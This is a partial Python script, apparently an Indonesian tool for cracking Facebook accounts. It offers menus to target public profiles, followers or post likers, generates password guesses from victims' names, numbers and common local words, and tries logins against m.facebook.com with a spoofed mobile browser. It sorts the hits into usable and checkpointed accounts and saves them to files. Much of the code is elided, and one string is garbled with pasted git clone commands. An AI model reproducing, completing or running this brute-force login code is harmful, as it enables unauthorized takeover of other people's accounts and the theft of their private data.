...
def banner():
    print("\n%s    _________ __     \n%s   / ____/ (_) /____  ║ %sDesign By : %Angga-13\n%s  / __/ / / / __/ _ \ ║ %sVersion   %s: %s%s1.2 \n / /___/ / / /_/  __/ ║ %sInstagram %s: %s@Anggatp55\n%s/_____/_/_/\__/\___/  ║ %sMy Github %s: %sgithub.com/AnggaXD13\n"%(O,P,O,P,O,P,P,P,P,P,O,P,P,P,O,P))
def menu_log():
...
def menu():
    ...
    print('%s║'%(O))
    print('%s╠══[%s•%s] %sStatus : Premium Jalur Orang Dalam'%(O,P,O,P))
    print('%s╠══[%s•%s] %sName : Angga-13'%(O,P,O,P))
    print('%s╠══[%s•%s] %sEmail : hanztzy@gmail.com'%(O,P,O,P))
    print('%s╠══[%s•%s] %sKey : XNXX-XHAMSTER-XUBS'%(O,P,O,P))
    print('%s╠══[%s•%s] %sJoin Since : Sampai Meninggal'%(O,P,O,P))
    print('%s╠══[%s•%s] %sValid Until : Kiamat'%(O,P,O,P))
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sCrack Dari Public'%(O,P,O,P))
    print('%s╠══[%s2%s] %sCrack Dari Follower'%(O,P,O,P))
    print('%s╠══[%s3%s] %sCrack Dari Likes Post'%(O,P,O,P))
    print('%s╠══[%s4%s] %sCek Informasi Target '%(O,P,O,P))
    print('%s╠══[%s5%s] %sCek Jumlah Teman Target'%(O,P,O,P))
    print('%s╠══[%s6%s] %sCek Result Crack '%(O,P,O,P))
    print('%s╠══[%s7%s] %sCek Opsi Akun Checkpoint'%(O,P,O,P))
...
def publik():
    ...
    try:
        ...
        exit()
    try:
        print('%s╠══[%s•%s] %sProfil Harus Bersifat Publik!'%(O,P,O,P))
    ...
    for i in _cici_.split(" "):
        if len(i)<3:
            ...
            if len(i)==3 or len(i)==4 or len(i)==5:
                ...
                _dapunta_.append(i+"123456789")
    _dapunta_.append(_cici_.lower())
    _dapunta_.append("lamandau")
    _dapunta_.append("bajingan")
    _dapunta_.append("pangkalanbun")
    _dapunta_.append("kalimantan")
    _dapunta_.append("sayang")
    _dapunta_.append("bangsat")
    _dapunta_.append("palangkaraya")
    _dapunta_.append("nangabulik")
    _dapunta_.append("sukamara")
...
def tambah_pass():
    print('%s║'%(O))
    print('%s╠══[%s•%s] %sFor Example :  hanztzygit clone https://github.com/AnggaXD13/el1t3
cd el1t3
python el1t3.pypengen,tempik'%(O,P,O,P))
...
def tambah_pass_angka():
    ...
    coy = input('%s╠══[%s•%s] %sMasukkan Pass Angka Tambahan : '%(O,P,O,P))
...
class crack:
    def __init__(self,files):
        ...
        self.ko = 0
        print('%s║'%(O))
        print('%s╠══[%s•%s] %sCrack Menggunakan Pasaword [d/m]'%(O,P,O,P))
        while True:
...
def log_hasil(user, pasw):
    ua = "Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36"
    ses = requests.Session()
    ses.headers.update({
    "Host": "m.facebook.com",
    "cache-control": "max-age=0",
    ...
    try:
        ...
        print("%s     %s!%s %sSpam Accounts"%(M,P,M,M))
    if "c_user" in ses.cookies:
        print("%s     %s•   %sAccount OK No Checkpointt"%(H,K,K))
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        ...
        ngew = [yy.text for yy in xnxx.find_all("option")]
        if(str(len(ngew))=="0"):
            print("%s%s✨%s %sHore, Akun ini tap yes! Login menggunakan FBLite yak ."%(H,P,H,K))
        else:
        ...
        print("%s     %s•%s %s%s"%(M,P,M,M,oh))
    else:
        print("%s     %s•%s %sPassword Has Changed"%(M,P,M,M))
def cek_hasil():
...
def start_methodezz():
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sNama + Angka %s[%s1-9%s]'%(O,P,O,P,H,H,H))
    print('%s╠══[%s2%s] %sPaket Komplit %s[%sLengkap%s]'%(O,P,O,P,H,H,H))
    print('%s╠══[%s3%s] %sSimple Tzy%s [%s3 & 5%s]'%(O,P,O,P,H,H,H))
    print('%s╠══[%s4%s] %sPassword Tambahan'%(O,P,O,P))
def started():
    print('%s║'%(O))
    print('%s╠══[%s•%s] %sCrack Sedang Berjalan!'%(O,P,O,P))
    print('%s╠══[%s•%s] %sHasil [OK] Disimpan Ke OK/%s.txt'%(O,P,O,P,tanggal))
    print('%s╠══[%s•%s] %sHasil [CP] Disimpan Ke CP/%s.txt'%(O,P,O,P,tanggal))
